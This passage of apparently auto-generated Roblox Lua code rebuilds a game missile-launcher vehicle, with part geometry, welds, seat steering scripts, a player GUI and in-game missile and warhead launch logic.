Part9.CanCollide = false
Part9.FormFactor = Enum.FormFactor.Symmetric
Part9.Size = Vector3.new(2, 2, 3)
Part9.CFrame = CFrame.new(12.8898888, 9.10011101, 38.9598045, 1.50947981e-05, 5.43772376e-06, 1, -2.21862356e-05, 1, -5.9147028e-06, -1, -1.53604906e-05, 5.38406312e-06)
Part9.BackSurface = Enum.SurfaceType.Weld
Part9.BottomSurface = Enum.SurfaceType.Weld
Part9.LeftSurface = Enum.SurfaceType.Weld
Part9.TopSurface = Enum.SurfaceType.Weld
Part9.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part9.Position = Vector3.new(12.8898888, 9.10011101, 38.9598045)
Part9.Orientation = Vector3.new(0, 90, 0)
Part9.Color = Color3.new(0.498039, 0.556863, 0.392157)
CylinderMesh10.Parent = Part9
CylinderMesh10.Scale = Vector3.new(1.5, 1, 2)
CylinderMesh10.Scale = Vector3.new(1.5, 1, 2)
Weld11.Parent = Part9
Weld11.C0 = CFrame.new(0, -1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
Weld12.Parent = Part9
Weld12.C0 = CFrame.new(0, -1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
Weld12.Part0 = Part9
Weld12.Part1 = Part79
Part13.Name = "Wpart"
Part13.Parent = Model1
Part13.Material = Enum.Material.Metal
Part13.BrickColor = BrickColor.new("Grime")
Part13.Rotation = Vector3.new(0, 90, 0)
Part13.FormFactor = Enum.FormFactor.Symmetric
Part13.Size = Vector3.new(2, 1, 2)
Part13.CFrame = CFrame.new(14.3899441, 12.0000477, 38.9595566, 1.52723678e-05, 5.4290017e-06, 1, -2.23110437e-05, 1, -5.90597438e-06, -1, -1.54852969e-05, 5.56163559e-06)
Part13.BottomSurface = Enum.SurfaceType.Smooth
Part13.LeftSurface = Enum.SurfaceType.Weld
Part13.RightSurface = Enum.SurfaceType.Weld
Part13.TopSurface = Enum.SurfaceType.Smooth
Part13.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part13.Position = Vector3.new(14.3899441, 12.0000477, 38.9595566)
Part13.Orientation = Vector3.new(0, 90, 0)
Part13.Color = Color3.new(0.498039, 0.556863, 0.392157)
Script14.Parent = Part13
table.insert(cors,sandbox(Script14,function()
b = script.Parent
c = script.Parent.Parent.Connector2

	local weld = Instance.new("Weld")

	weld.Part0 = c
	weld.Part1 = b

	weld.C0 = CFrame.new(0, 0, 1.5)

	weld.Parent = c

script.Parent.Parent.WER2.Value = weld
end))
BlockMesh15.Parent = Part13
Part16.Parent = Model1
Part16.Material = Enum.Material.Metal
Part16.BrickColor = BrickColor.new("Grime")
Part16.Rotation = Vector3.new(90, 0, -90)
Part16.FormFactor = Enum.FormFactor.Symmetric
Part16.Size = Vector3.new(1, 1, 1)
Part16.CFrame = CFrame.new(14.8899441, 12.0000582, 38.9595566, 3.124254e-05, 1, -4.64493451e-06, -3.3536413e-05, -5.12120005e-06, -1, -1, 2.15318451e-05, 2.67105879e-05)
Part16.BottomSurface = Enum.SurfaceType.Weld
Part16.TopSurface = Enum.SurfaceType.Weld
Part16.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part16.Position = Vector3.new(14.8899441, 12.0000582, 38.9595566)
Part16.Orientation = Vector3.new(90, 90, 0)
Part16.Color = Color3.new(0.498039, 0.556863, 0.392157)
CylinderMesh17.Parent = Part16
CylinderMesh17.Scale = Vector3.new(1.89999998, 1, 1.60000002)
CylinderMesh17.Scale = Vector3.new(1.89999998, 1, 1.60000002)
Part18.Name = "Connector2"
Part18.Parent = Model1
Part18.Material = Enum.Material.Metal
Part18.BrickColor = BrickColor.new("Grime")
Part18.Rotation = Vector3.new(0, 90, 0)
Part18.FormFactor = Enum.FormFactor.Symmetric
Part18.Size = Vector3.new(1, 1, 1)
Part18.CFrame = CFrame.new(12.8899441, 12.0000563, 38.959549, 1.52723678e-05, 5.4290017e-06, 1, -2.23110437e-05, 1, -5.90597438e-06, -1, -1.54852969e-05, 5.56163559e-06)
Part18.BottomSurface = Enum.SurfaceType.Weld
Part18.TopSurface = Enum.SurfaceType.Weld
Part18.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part18.Position = Vector3.new(12.8899441, 12.0000563, 38.959549)
Part18.Orientation = Vector3.new(0, 90, 0)
Part18.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh19.Parent = Part18
Weld20.Parent = Part18
Weld20.C0 = CFrame.new(0, 0, 1.5, 1, 0, 0, 0, 1, 0, 0, 0, 1)
Weld21.Parent = Part18
Weld21.C0 = CFrame.new(0, 0, 1.5, 1, 0, 0, 0, 1, 0, 0, 0, 1)
Weld22.Parent = Part18
Weld22.C0 = CFrame.new(0, 0, 1.5, 1, 0, 0, 0, 1, 0, 0, 0, 1)
Weld22.Part0 = Part18
Weld22.Part1 = Part13
Part23.Parent = Model1
Part23.Material = Enum.Material.Metal
Part23.BrickColor = BrickColor.new("Grime")
Part23.Rotation = Vector3.new(-90, 0, 180)
Part23.FormFactor = Enum.FormFactor.Plate
Part23.Size = Vector3.new(1, 0.400000006, 1.20000005)
Part23.CFrame = CFrame.new(13.8899651, 11.5000286, 37.7595558, -1, -3.11981494e-05, 4.64657705e-06, 5.12284532e-06, 3.350517e-05, 1, -2.14874563e-05, 1, -2.66793468e-05)
Part23.BackSurface = Enum.SurfaceType.Weld
Part23.BottomSurface = Enum.SurfaceType.Weld
Part23.FrontSurface = Enum.SurfaceType.Weld
Part23.LeftSurface = Enum.SurfaceType.Weld
Part23.RightSurface = Enum.SurfaceType.Weld
Part23.TopSurface = Enum.SurfaceType.Smooth
Part23.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part23.Position = Vector3.new(13.8899651, 11.5000286, 37.7595558)
Part23.Orientation = Vector3.new(-90, 180, 0)
Part23.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh24.Parent = Part23
Part25.Parent = Model1
Part25.Material = Enum.Material.Metal
Part25.BrickColor = BrickColor.new("Grime")
Part25.Rotation = Vector3.new(-90, 0, 180)
Part25.FormFactor = Enum.FormFactor.Custom
Part25.Size = Vector3.new(3, 0.400000006, 0.399999976)
Part25.CFrame = CFrame.new(12.8899288, 10.7000723, 37.7598228, -1, -1.52280863e-05, 5.43084116e-06, 5.90815625e-06, -7.7088643e-08, 1, -5.51722951e-06, 1, 6.90283105e-06)
Part25.BackSurface = Enum.SurfaceType.Weld
Part25.BottomSurface = Enum.SurfaceType.Weld
Part25.FrontSurface = Enum.SurfaceType.Weld
Part25.LeftSurface = Enum.SurfaceType.Weld
Part25.RightSurface = Enum.SurfaceType.Weld
Part25.TopSurface = Enum.SurfaceType.Smooth
Part25.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part25.Position = Vector3.new(12.8899288, 10.7000723, 37.7598228)
Part25.Orientation = Vector3.new(-90, 180, 0)
Part25.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh26.Parent = Part25
Part27.Parent = Model1
Part27.Material = Enum.Material.Metal
Part27.BrickColor = BrickColor.new("Grime")
Part27.Rotation = Vector3.new(90, 0, 0)
Part27.FormFactor = Enum.FormFactor.Plate
Part27.Size = Vector3.new(1, 0.400000006, 1)
Part27.CFrame = CFrame.new(13.8899403, 11.6000576, 37.3598328, 1, -1.52945649e-05, -5.42817907e-06, -5.90515128e-06, 2.23266634e-05, -1, 5.5838309e-06, 1, 1.55009166e-05)
Part27.BackSurface = Enum.SurfaceType.Weld
Part27.BottomSurface = Enum.SurfaceType.Smooth
Part27.FrontSurface = Enum.SurfaceType.Weld
Part27.LeftSurface = Enum.SurfaceType.Weld
Part27.RightSurface = Enum.SurfaceType.Weld
Part27.TopSurface = Enum.SurfaceType.Weld
Part27.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part27.Position = Vector3.new(13.8899403, 11.6000576, 37.3598328)
Part27.Orientation = Vector3.new(90, 0, 0)
Part27.Color = Color3.new(0.498039, 0.556863, 0.392157)
CylinderMesh28.Parent = Part27
CylinderMesh28.Offset = Vector3.new(0, 1.60000002, 0)
CylinderMesh28.Scale = Vector3.new(0.800000012, 8, 2)
CylinderMesh28.Scale = Vector3.new(0.800000012, 8, 2)
Part29.Parent = Model1
Part29.Material = Enum.Material.Metal
Part29.BrickColor = BrickColor.new("Grime")
Part29.Rotation = Vector3.new(180, 0, -180)
Part29.FormFactor = Enum.FormFactor.Plate
Part29.Size = Vector3.new(1, 0.800000012, 1)
Part29.CFrame = CFrame.new(13.8901453, 7.60008192, 38.9598312, -1, 6.80900757e-06, -1.28170986e-05, 7.24961728e-06, 1, -3.05093963e-05, 2.17730885e-05, -2.42142978e-05, -1)
Part29.BackSurface = Enum.SurfaceType.Weld
Part29.BottomSurface = Enum.SurfaceType.Weld
Part29.FrontSurface = Enum.SurfaceType.Weld
Part29.LeftSurface = Enum.SurfaceType.Weld
Part29.RightSurface = Enum.SurfaceType.Weld
Part29.TopSurface = Enum.SurfaceType.Smooth
Part29.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part29.Position = Vector3.new(13.8901453, 7.60008192, 38.9598312)
Part29.Orientation = Vector3.new(0, -180, 0)
Part29.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh30.Parent = Part29
Part31.Parent = Model1
Part31.Material = Enum.Material.Metal
Part31.BrickColor = BrickColor.new("Grime")
Part31.FormFactor = Enum.FormFactor.Plate
Part31.Size = Vector3.new(1, 0.800000012, 1)
Part31.CFrame = CFrame.new(11.8901434, 7.60010433, 38.9599037, 1, 6.32152023e-06, 2.89539616e-06, -6.78039805e-06, 1, 3.84974592e-05, -1.22286801e-05, -3.19370556e-05, 1)
Part31.BackSurface = Enum.SurfaceType.Weld
Part31.BottomSurface = Enum.SurfaceType.Weld
Part31.FrontSurface = Enum.SurfaceType.Weld
Part31.LeftSurface = Enum.SurfaceType.Weld
Part31.RightSurface = Enum.SurfaceType.Weld
Part31.TopSurface = Enum.SurfaceType.Smooth
Part31.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part31.Position = Vector3.new(11.8901434, 7.60010433, 38.9599037)
Part31.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh32.Parent = Part31
ObjectValue33.Name = "WER2"
ObjectValue33.Parent = Model1
ObjectValue33.Value = Weld22
VehicleSeat34.Parent = Model1
VehicleSeat34.BrickColor = BrickColor.new("Really red")
VehicleSeat34.Rotation = Vector3.new(0, 90, 0)
VehicleSeat34.Size = Vector3.new(2, 0.400000006, 2)
VehicleSeat34.CFrame = CFrame.new(-23.1100998, 4.80056763, 33.6601639, -1.67083635e-05, 6.97150199e-06, 1, -2.32027105e-07, 0.999991715, -7.13226291e-06, -1.00000143, 1.9876245e-06, -2.00193008e-05)
VehicleSeat34.TopSurface = Enum.SurfaceType.Weld
VehicleSeat34.HeadsUpDisplay = false
VehicleSeat34.MaxSpeed = 50
VehicleSeat34.Color = Color3.new(1, 0, 0)
VehicleSeat34.Position = Vector3.new(-23.1100998, 4.80056763, 33.6601639)
VehicleSeat34.Orientation = Vector3.new(0, 90, 0)
VehicleSeat34.Color = Color3.new(1, 0, 0)
Sound35.Name = "Swiv"
Sound35.Parent = VehicleSeat34
Sound35.Pitch = 0.69999998807907
Sound35.SoundId = "http://www.roblox.com/asset/?id=31245465"
Sound35.Volume = 0
Sound35.PlayOnRemove = true
Script36.Name = "Control"
Script36.Parent = VehicleSeat34
table.insert(cors,sandbox(Script36,function()
while true do
wait()
if script.Parent.Steer == 2 then
script.Parent.Swiv:play()
script.Parent.Parent.WER.Value.C0 = script.Parent.Parent.WER.Value.C0 * CFrame.fromEulerAnglesXYZ(0,0.01,0)
elseif script.Parent.Steer == -2 then
script.Parent.Swiv:play()
script.Parent.Parent.WER.Value.C0 = script.Parent.Parent.WER.Value.C0 * CFrame.fromEulerAnglesXYZ(0,-0.01,0)
elseif script.Parent.Steer == 0 and script.Parent.Throttle == 0 then
script.Parent.Swiv:pause()
end
end

end))
Script37.Name = "Control2"
Script37.Parent = VehicleSeat34
table.insert(cors,sandbox(Script37,function()
angle = 0

while true do
wait()
if script.Parent.Throttle == 1 and angle < 160 then
script.Parent.Swiv:play()
angle = angle + 1
script.Parent.Angle.Value = angle
script.Parent.Parent.WER2.Value.C0 = script.Parent.Parent.WER2.Value.C0 * CFrame.fromEulerAnglesXYZ(-0.01,0,0)
elseif script.Parent.Throttle == -1 and angle > 0 then
script.Parent.Swiv:play()
angle = angle - 1
script.Parent.Angle.Value = angle
script.Parent.Parent.WER2.Value.C0 = script.Parent.Parent.WER2.Value.C0 * CFrame.fromEulerAnglesXYZ(0.01,0,0)
end
end

end))
BlockMesh38.Parent = VehicleSeat34
Script39.Name = "Pickup"
Script39.Parent = VehicleSeat34
table.insert(cors,sandbox(Script39,function()
script.Parent.ChildAdded:connect(function(w)
print("ChildAdded")
if w.className=="Weld" then
print("IsAWeld")
if w.Name=="SeatWeld" then
print("IsASeatWeld")
if w.Part1.Parent:findFirstChild("Humanoid")~=nil then
print("IsAHumanoid")
pl=game.Players:GetPlayerFromCharacter(w.Part1.Parent)
if pl~=nil then
print("IsAPlayer")
if pl.PlayerGui:findFirstChild("VehicleGui")~=nil then
print("found vehicle gui - deleting")
pl.PlayerGui:findFirstChild("VehicleGui").Parent=nil
print("deleted")
else
print("no gui found - adding")
newgui=script.Parent.VehicleGui:clone()
newgui.Parent=pl.PlayerGui
newgui.Vehicle.Value=script.Parent.Parent
print("added")
end
end
end
end
end
end)

script.Parent.ChildRemoved:connect(function(w)
print("ChildRemoved")
if w.className=="Weld" then
print("IsAWeld")
if w.Name=="SeatWeld" then
print("IsASeatWeld")
if w.Part1.Parent:findFirstChild("Humanoid")~=nil then
print("IsAHumanoid")
pl=game.Players:GetPlayerFromCharacter(w.Part1.Parent)
if pl~=nil then
print("IsAPlayer")
if pl.PlayerGui:findFirstChild("VehicleGui")~=nil then
print("found vehicle gui - deleting")
pl.PlayerGui:findFirstChild("VehicleGui").Parent=nil
print("deleted")
else
print("no gui found - wierd...")
end
end
end
end
end
end)


end))
ScreenGui40.Name = "VehicleGui"
ScreenGui40.Parent = VehicleSeat34
Frame41.Parent = ScreenGui40
Frame41.Transparency = 1
Frame41.Size = UDim2.new(0.200000003, 0, 0.0500000007, 0)
Frame41.Position = UDim2.new(0, 0, 0.800000012, 0)
Frame41.BackgroundColor3 = Color3.new(0.905882, 0.905882, 0.905882)
Frame41.BackgroundTransparency = 1
Frame41.BorderColor3 = Color3.new(0, 0, 0)
TextButton42.Name = "Machine"
TextButton42.Parent = Frame41
TextButton42.Transparency = 1
TextButton42.Size = UDim2.new(1, 0, 2, 0)
TextButton42.Style = Enum.ButtonStyle.RobloxButtonDefault
TextButton42.Text = "Machine Guns"
TextButton42.Position = UDim2.new(2, 0, -1, 0)
TextButton42.Active = false
TextButton42.Visible = false
TextButton42.BackgroundColor3 = Color3.new(0, 0, 1)
TextButton42.BackgroundTransparency = 1
TextButton42.BorderColor3 = Color3.new(0, 0, 0)
TextButton42.AutoButtonColor = false
TextButton42.FontSize = Enum.FontSize.Size24
TextButton42.TextColor3 = Color3.new(1, 1, 1)
TextButton43.Name = "SABOT"
TextButton43.Parent = Frame41
TextButton43.Transparency = 0.5
TextButton43.Size = UDim2.new(2, 0, 2, 0)
TextButton43.Text = "Launch Cruise Missile"
TextButton43.Position = UDim2.new(0.0350000001, 0, 1.5, 0)
TextButton43.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton43.BackgroundTransparency = 0.5
TextButton43.BorderColor3 = Color3.new(0, 0, 0)
TextButton43.Font = Enum.Font.ArialBold
TextButton43.FontSize = Enum.FontSize.Size36
TextButton43.TextColor3 = Color3.new(1, 1, 1)
TextButton43.TextStrokeTransparency = 0
TextButton44.Name = "SMOKE"
TextButton44.Parent = Frame41
TextButton44.Size = UDim2.new(2, 0, 2, 0)
TextButton44.Style = Enum.ButtonStyle.RobloxButtonDefault
TextButton44.Text = "Fire SMOKE"
TextButton44.Position = UDim2.new(0.0500000007, 0, -3, 0)
TextButton44.Visible = false
TextButton44.BackgroundColor3 = Color3.new(0, 0, 1)
TextButton44.BorderColor3 = Color3.new(0, 0, 0)
TextButton44.FontSize = Enum.FontSize.Size48
TextButton44.TextColor3 = Color3.new(1, 1, 1)
TextButton45.Name = "HEAT"
TextButton45.Parent = Frame41
TextButton45.Transparency = 0.5
TextButton45.Size = UDim2.new(2, 0, 2, 0)
TextButton45.Text = "Fire 155mm Howitzer"
TextButton45.Position = UDim2.new(0.0250000115, 0, -1, 0)
TextButton45.Visible = false
TextButton45.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton45.BackgroundTransparency = 0.5
TextButton45.BorderColor3 = Color3.new(0, 0, 0)
TextButton45.Font = Enum.Font.ArialBold
TextButton45.FontSize = Enum.FontSize.Size36
TextButton45.TextColor3 = Color3.new(1, 1, 1)
Script46.Parent = Frame41
table.insert(cors,sandbox(Script46,function()
repeat wait() until script.Parent.Parent.Vehicle.Value~=nil

db=false
held=false

v = script.Parent.Parent.Vehicle
f = script.Parent
sabot = script.Parent.SABOT
enable = script.Parent.Parent.red_roof
fakemiss = v.Value.FakeMissile

function launchsabot()
enable.Visible = true
v.Value.Effect.Smoke.Enabled = true
v.Value.Effect.Fire:Play()
v.Value.Effect.Transparency = .5
local v1=v.Value.Missile:clone()
v1.CFrame = v.Value.Missile.CFrame * CFrame.new(0, 0, -5)
v1.Smoke.Enabled = true
v1.Smoke1.Enabled = true
v1.Smoke2.Enabled = true
v1.Smoke3.Enabled = true
v1.Smoke4.Enabled = true
v1.Fire.Enabled = true
v1.Spark.Enabled = true
fakemiss:remove()
local vel=Instance.new("BodyVelocity")
vel.Parent=v1
v1.Velocity=v1.CFrame.lookVector*150
vel.velocity=v1.Velocity
v1.CanCollide=false
v1.Transparency= 0
v1.Parent=workspace
wait(12)
v1:remove()
v.Value.Effect.Transparency = 1
v.Value.Effect.Smoke.Enabled = false
wait(7)
v1:remove()
sabot.Visible = false
end

function sabotclick()
print("click missile")
if db==true then return end
db=true
sabot.Text="Reloading..."
launchsabot()
sabot.Visible = false
db=false
end

sabot.MouseButton1Click:connect(sabotclick)





end))
ObjectValue47.Name = "Vehicle"
ObjectValue47.Parent = ScreenGui40
Frame48.Name = "CoordinateModule"
Frame48.Parent = ScreenGui40
Frame48.Transparency = 1
Frame48.Size = UDim2.new(0, 100, 0, 100)
Frame48.Position = UDim2.new(0, 50, 0, 400)
Frame48.BackgroundColor3 = Color3.new(1, 1, 1)
Frame48.BackgroundTransparency = 1
TextButton49.Name = "AddVariableX"
TextButton49.Parent = Frame48
TextButton49.Size = UDim2.new(0, 20, 0, 20)
TextButton49.Style = Enum.ButtonStyle.RobloxButton
TextButton49.Text = "+"
TextButton49.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton49.Font = Enum.Font.SourceSans
TextButton49.FontSize = Enum.FontSize.Size36
TextButton49.TextColor3 = Color3.new(1, 1, 1)
Script50.Parent = TextButton49
table.insert(cors,sandbox(Script50,function()
x = script.Parent.Parent.VariableX
vx = script.Parent.Parent.Variable1

function onButtonClicked()
x.Value = x.Value + 10
vx.Text="x:("..tostring(x.Value)..")"
end
script.Parent.MouseButton1Click:connect(onButtonClicked)
end))
TextButton51.Name = "SubtractVariableX"
TextButton51.Parent = Frame48
TextButton51.Size = UDim2.new(0, 20, 0, 20)
TextButton51.Style = Enum.ButtonStyle.RobloxButton
TextButton51.Text = "-"
TextButton51.Position = UDim2.new(0, 30, 0, 0)
TextButton51.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton51.Font = Enum.Font.SourceSans
TextButton51.FontSize = Enum.FontSize.Size36
TextButton51.TextColor3 = Color3.new(1, 1, 1)
Script52.Parent = TextButton51
table.insert(cors,sandbox(Script52,function()
x = script.Parent.Parent.VariableX
vx = script.Parent.Parent.Variable1

function onButtonClicked()
x.Value = x.Value - 10
vx.Text="x:("..tostring(x.Value)..")"
end
script.Parent.MouseButton1Click:connect(onButtonClicked)
end))
TextLabel53.Name = "Variable1"
TextLabel53.Parent = Frame48
TextLabel53.Size = UDim2.new(0, 150, 0, 20)
TextLabel53.Text = "x:(0)"
TextLabel53.Position = UDim2.new(0, 60, 0, 0)
TextLabel53.BackgroundColor3 = Color3.new(0, 0, 0)
TextLabel53.Font = Enum.Font.ArialBold
TextLabel53.FontSize = Enum.FontSize.Size14
TextLabel53.TextColor3 = Color3.new(1, 1, 1)
TextButton54.Name = "AddVariableZ"
TextButton54.Parent = Frame48
TextButton54.Size = UDim2.new(0, 20, 0, 20)
TextButton54.Style = Enum.ButtonStyle.RobloxButton
TextButton54.Text = "+"
TextButton54.Position = UDim2.new(0, 0, 0, 30)
TextButton54.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton54.Font = Enum.Font.SourceSans
TextButton54.FontSize = Enum.FontSize.Size36
TextButton54.TextColor3 = Color3.new(1, 1, 1)
Script55.Parent = TextButton54
table.insert(cors,sandbox(Script55,function()
z = script.Parent.Parent.VariableZ
vz = script.Parent.Parent.Variable2

function onButtonClicked()
z.Value = z.Value + 10
vz.Text="z:("..tostring(z.Value)..")"
end
script.Parent.MouseButton1Click:connect(onButtonClicked)
end))
TextButton56.Name = "SubtractVariableZ"
TextButton56.Parent = Frame48
TextButton56.Size = UDim2.new(0, 20, 0, 20)
TextButton56.Style = Enum.ButtonStyle.RobloxButton
TextButton56.Text = "-"
TextButton56.Position = UDim2.new(0, 30, 0, 30)
TextButton56.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton56.Font = Enum.Font.SourceSans
TextButton56.FontSize = Enum.FontSize.Size36
TextButton56.TextColor3 = Color3.new(1, 1, 1)
Script57.Parent = TextButton56
table.insert(cors,sandbox(Script57,function()
z = script.Parent.Parent.VariableZ
vz = script.Parent.Parent.Variable2

function onButtonClicked()
z.Value = z.Value - 10
vz.Text="z:("..tostring(z.Value)..")"
end
script.Parent.MouseButton1Click:connect(onButtonClicked)
end))
TextLabel58.Name = "Variable2"
TextLabel58.Parent = Frame48
TextLabel58.Size = UDim2.new(0, 150, 0, 20)
TextLabel58.Text = "y:(0)"
TextLabel58.Position = UDim2.new(0, 60, 0, 30)
TextLabel58.BackgroundColor3 = Color3.new(0, 0, 0)
TextLabel58.Font = Enum.Font.ArialBold
TextLabel58.FontSize = Enum.FontSize.Size14
TextLabel58.TextColor3 = Color3.new(1, 1, 1)
NumberValue59.Name = "VariableX"
NumberValue59.Parent = Frame48
NumberValue60.Name = "VariableY"
NumberValue60.Parent = Frame48
NumberValue61.Name = "VariableZ"
NumberValue61.Parent = Frame48
Frame62.Name = "MeterModule"
Frame62.Parent = ScreenGui40
Frame62.Size = UDim2.new(0, 100, 0, 160)
Frame62.Position = UDim2.new(0, 50, 0, 230)
Frame62.BackgroundColor3 = Color3.new(0.211765, 0.211765, 0.211765)
TextLabel63.Name = "S1A"
TextLabel63.Parent = Frame62
TextLabel63.Size = UDim2.new(0, 95, 0, 30)
TextLabel63.Text = "STAGE 1"
TextLabel63.Position = UDim2.new(0.0250000004, 0, 0.0250000004, 0)
TextLabel63.BackgroundColor3 = Color3.new(0.576471, 0.333333, 0.407843)
TextLabel63.Font = Enum.Font.ArialBold
TextLabel63.FontSize = Enum.FontSize.Size18
TextLabel64.Name = "S2A"
TextLabel64.Parent = Frame62
TextLabel64.Size = UDim2.new(0, 95, 0, 30)
TextLabel64.Text = "STAGE 2"
TextLabel64.Position = UDim2.new(0.0250000004, 0, 0.25, 1)
TextLabel64.BackgroundColor3 = Color3.new(0.576471, 0.333333, 0.407843)
TextLabel64.Font = Enum.Font.ArialBold
TextLabel64.FontSize = Enum.FontSize.Size18
TextLabel65.Name = "S3A"
TextLabel65.Parent = Frame62
TextLabel65.Size = UDim2.new(0, 95, 0, 30)
TextLabel65.Text = "STAGE 3"
TextLabel65.Position = UDim2.new(0.0250000004, 0, 0.5, 1)
TextLabel65.BackgroundColor3 = Color3.new(0.576471, 0.333333, 0.407843)
TextLabel65.Font = Enum.Font.ArialBold
TextLabel65.FontSize = Enum.FontSize.Size18
TextLabel66.Name = "S4A"
TextLabel66.Parent = Frame62
TextLabel66.Size = UDim2.new(0, 95, 0, 30)
TextLabel66.Text = "STAGE 4"
TextLabel66.Position = UDim2.new(0.0250000004, 0, 0.75, 1)
TextLabel66.BackgroundColor3 = Color3.new(0.576471, 0.333333, 0.407843)
TextLabel66.Font = Enum.Font.ArialBold
TextLabel66.FontSize = Enum.FontSize.Size18
TextLabel67.Name = "S1B"
TextLabel67.Parent = Frame62
TextLabel67.Size = UDim2.new(0, 95, 0, 30)
TextLabel67.Text = "STAGE 1"
TextLabel67.Position = UDim2.new(0.0250000004, 0, 0.0250000004, 0)
TextLabel67.Visible = false
TextLabel67.BackgroundColor3 = Color3.new(0.196078, 0.576471, 0.0901961)
TextLabel67.Font = Enum.Font.ArialBold
TextLabel67.FontSize = Enum.FontSize.Size18
TextLabel68.Name = "S2B"
TextLabel68.Parent = Frame62
TextLabel68.Size = UDim2.new(0, 95, 0, 30)
TextLabel68.Text = "STAGE 2"
TextLabel68.Position = UDim2.new(0.0250000004, 0, 0.25, 1)
TextLabel68.Visible = false
TextLabel68.BackgroundColor3 = Color3.new(0.196078, 0.576471, 0.0901961)
TextLabel68.Font = Enum.Font.ArialBold
TextLabel68.FontSize = Enum.FontSize.Size18
TextLabel69.Name = "S3B"
TextLabel69.Parent = Frame62
TextLabel69.Size = UDim2.new(0, 95, 0, 30)
TextLabel69.Text = "STAGE 3"
TextLabel69.Position = UDim2.new(0.0250000004, 0, 0.5, 1)
TextLabel69.Visible = false
TextLabel69.BackgroundColor3 = Color3.new(0.196078, 0.576471, 0.0901961)
TextLabel69.Font = Enum.Font.ArialBold
TextLabel69.FontSize = Enum.FontSize.Size18
TextLabel70.Name = "S4B"
TextLabel70.Parent = Frame62
TextLabel70.Size = UDim2.new(0, 95, 0, 30)
TextLabel70.Text = "STAGE 4"
TextLabel70.Position = UDim2.new(0.0250000004, 0, 0.75, 1)
TextLabel70.Visible = false
TextLabel70.BackgroundColor3 = Color3.new(0.196078, 0.576471, 0.0901961)
TextLabel70.Font = Enum.Font.ArialBold
TextLabel70.FontSize = Enum.FontSize.Size18
TextButton71.Name = "red_roof"
TextButton71.Parent = ScreenGui40
TextButton71.Transparency = 0.5
TextButton71.Size = UDim2.new(0, 100, 0, 20)
TextButton71.Text = "ENABLE"
TextButton71.Position = UDim2.new(0, 270, 0, 400)
TextButton71.Visible = false
TextButton71.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton71.BackgroundTransparency = 0.5
TextButton71.Font = Enum.Font.ArialBold
TextButton71.FontSize = Enum.FontSize.Size14
TextButton71.TextColor3 = Color3.new(1, 1, 1)
TextButton71.TextStrokeTransparency = 0
Script72.Parent = TextButton71
table.insert(cors,sandbox(Script72,function()
repeat wait() until script.Parent.Parent.Vehicle.Value~=nil

db=false
held=false

v = script.Parent.Parent.Vehicle
vz = script.Parent.Parent.CoordinateModule.VariableZ
vx = script.Parent.Parent.CoordinateModule.VariableX
vy = script.Parent.Parent.CoordinateModule.VariableY
wh = v.Value.Warhead
mm = script.Parent.Parent.MeterModule

function stage1()
	script.Parent.Visible = false
	mm.S1A.Visible = false
	mm.S1B.Visible = true
end

function stage2()
	mm.S1B.Visible = false
	mm.S1A.Visible = true
	mm.S2A.Visible = false
	mm.S2B.Visible = true
end

function stage3()
	mm.S2B.Visible = false
	mm.S2A.Visible = true
	mm.S3A.Visible = false
	mm.S3B.Visible = true
end

function stage4()
	mm.S3B.Visible = false
	mm.S3A.Visible = true
	mm.S4A.Visible = false
	mm.S4B.Visible = true	
end

function impact()
	wh.CFrame = CFrame.new((vx.Value), 1000, (vz.Value))
	wait(0.1)
	wh.Anchored = false
	wh.Transparency = 0
	wh.Touch.Disabled = false
	wh.Smoke.Enabled = true
	wh.Smoke2.Enabled = true
	wh.Smoke3.Enabled = true
	wh.Smoke4.Enabled = true
	wh.Light.Enabled = true
	wh.CanCollide = true
	local vel=Instance.new("BodyVelocity")
	vel.Parent=wh
	wh.Velocity=wh.CFrame.lookVector*60
	vel.velocity=wh.Velocity
end

function onButtonClicked()
	stage1()
	wait(5)
	stage2()
	wait(5)
	stage3()
	wait(5)
	stage4()
	wait(3)	
	mm.S4B.Visible = false
	mm.S4A.Visible = true
	impact()
end

script.Parent.MouseButton1Click:connect(onButtonClicked)
end))
Script73.Name = "MainFrame"
Script73.Parent = ScreenGui40
Script73.Disabled = true
table.insert(cors,sandbox(Script73,function()
repeat wait() until script.Parent.Parent.Vehicle.Value~=nil

db=false
held=false

v = script.Parent.Vehicle
vs = v.Value.VehicleSeat
mm = script.Parent.MeterModule
cm = script.Parent.CoordinateModule
fire = script.Parent.Frame
enable = script.Parent.red_roof
angle = vs.Angle

if angle.Value > 159 then
	mm.Visible = true
	cm.Visible = true
	fire.Visible = true
	enable.Visible = true
end

if angle.Value < 160 then
	mm.Visible = false
	cm.Visible = false
	fire.Visible = false
	enable.Visible = false
end

end))
NumberValue74.Name = "Angle"
NumberValue74.Parent = VehicleSeat34
Part75.Parent = Model1
Part75.Material = Enum.Material.Metal
Part75.BrickColor = BrickColor.new("Grime")
Part75.Rotation = Vector3.new(0, -90, 0)
Part75.FormFactor = Enum.FormFactor.Plate
Part75.Size = Vector3.new(1.80000007, 0.800000012, 1)
Part75.CFrame = CFrame.new(12.8898983, 7.6000824, 38.9598885, 1.79557064e-05, 9.34016316e-06, -1, 5.58539214e-05, 1, 9.81848007e-06, 1, -4.90284801e-05, 2.76660649e-05)
Part75.BackSurface = Enum.SurfaceType.Weld
Part75.BottomSurface = Enum.SurfaceType.Weld
Part75.FrontSurface = Enum.SurfaceType.Weld
